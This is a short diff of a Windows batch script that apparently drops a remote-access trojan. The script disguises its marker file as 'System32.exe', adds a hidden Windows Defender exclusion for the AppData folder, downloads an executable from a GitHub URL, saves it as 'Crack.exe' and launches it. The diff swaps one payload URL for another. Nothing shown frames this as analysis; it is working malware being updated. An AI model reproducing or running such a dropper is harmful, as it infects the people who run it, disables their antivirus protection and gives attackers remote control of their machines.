@@ -1,5 +1,5 @@
 @echo off
-set FILE="%USERPROFILE%\AppData\Roaming\Windows\System32.exe"
+set FILE="%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
 if exist %FILE% (
     exit /b
 )
@@ -15,7 +15,7 @@ if %errorlevel% NEQ 0 (
 )
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
-set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
